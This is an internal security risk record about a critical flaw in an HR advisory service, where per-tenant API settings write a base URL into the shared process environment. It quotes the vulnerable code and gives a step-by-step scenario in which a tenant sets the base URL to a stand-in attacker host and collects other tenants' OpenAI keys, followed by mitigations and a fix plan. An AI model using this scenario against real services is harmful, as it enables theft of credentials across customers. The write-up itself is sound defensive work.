# RISK — Multi-tenant `os.environ` poisoning in `arbor_loop.py`

**Date:** 2026-04-08
**Initiative:** hr-ai-advisory / ollama-provider
**Type:** RISK (security)
**Severity:** CRITICAL
**Status:** Live in production; pending fix in `02-plans/06-ollama-provider-plan.md`

## What

`src/hr_advisory/delegate/arbor_loop.py:95-98`:

```python
if base_url:
    os.environ.setdefault("OPENAI_BASE_URL", base_url)
if api_key and api_key != "not-needed":
    os.environ.setdefault("OPENAI_API_KEY", api_key)
```

This code runs in `create_delegate()`, which is called per advisory request. It mutates process-global environment variables based on per-tenant BYOK config.

## Attack scenario

1. Company A (attacker-controlled BYOK config) sets `base_url=http://attacker.example:11434` or any URL they control.
2. First advisory request from Company A hits `create_delegate()`. `setdefault` writes `OPENAI_BASE_URL=http://attacker.example:11434` into the process env.
3. All subsequent requests in the same Python process read the poisoned env.
4. Company B is on server-default OpenAI (no BYOK config). Their next advisory request builds a `Delegate` that reads `OPENAI_BASE_URL` from env (via kaizen-agents' `openai_adapter.py`).
5. Company B's OpenAI API key (the server's `OPENAI_API_KEY`) is sent as a bearer token to `attacker.example:11434`.
6. Company A now has Company B's OpenAI API key.

## Why `setdefault` makes it worse

- `setdefault` silently no-ops if the key already exists → the second BYOK config can't override the first. Whoever gets there first "owns" that env slot until the process restarts.
- `setdefault` gives the attacker deterministic behavior: they just need to be the first request after a restart.

## Scope of exposure

- **Affected today:** any multi-tenant Arbor deployment where multiple companies share one Python process. This is the production deployment on GCE `arbor-prod`.
- **Pre-condition for actual leak:** at least one company has saved a BYOK config with a non-default `base_url`. Per the BYOK audit, check if any production `CompanyLLMConfig` or `UserLLMConfig` rows have `base_url != null` OR `provider = 'ollama'`.
- **Attacker capability:** any user with `owner`, `hr_manager`, or `platform_admin` role on any company can save a BYOK config, and the `_validate_base_url` allowlist permits private/internal IPs (correct for DGX, but expands the attack surface).

## Immediate mitigations (before the fix lands)

1. **Audit**: query `CompanyLLMConfig` and `UserLLMConfig` for any rows with `base_url IS NOT NULL` on production.
2. **If any exist**: assume `OPENAI_API_KEY` may have been leaked — rotate the production key, monitor for unusual usage.
3. **If none exist**: log a warning and proceed with the fix. Attack surface is zero until the first BYOK save.
4. **Meanwhile**: disable BYOK save endpoints temporarily, or deploy a hotfix that forces `base_url=None` in `CompanyLLMConfig` / `UserLLMConfig` for all existing rows.

## Permanent fix

Per `02-plans/06-ollama-provider-plan.md` Phase 2:

- Delete the `os.environ.setdefault(...)` lines entirely
- Build the adapter per-request, pass `adapter=` to `Delegate(...)`
- Adapters are in-process, per-request instances — no global state

This is the same fix that enables Ollama routing, so the security fix and feature fix land in one PR.

## Disclosure consideration

If the audit finds historical BYOK configs: the Foundation should prepare an incident-response notice to affected customers per its security policy. The attack is opportunistic, not necessarily exploited, but the exposure window is the entire lifetime of BYOK in production.

## Related

- `01-analysis/17-ollama-provider/02-gap-analysis.md` — bug C1
- `01-analysis/17-ollama-provider/03-red-team-findings.md` — red team confirmation
- `01-analysis/17-ollama-provider/04-open-questions.md` — Q6 (security review + audit)
- `rules/agents.md` Rule 2 — mandatory security-reviewer pass before commit
- `rules/security.md` — no secrets in logs (related concern on audit trail)
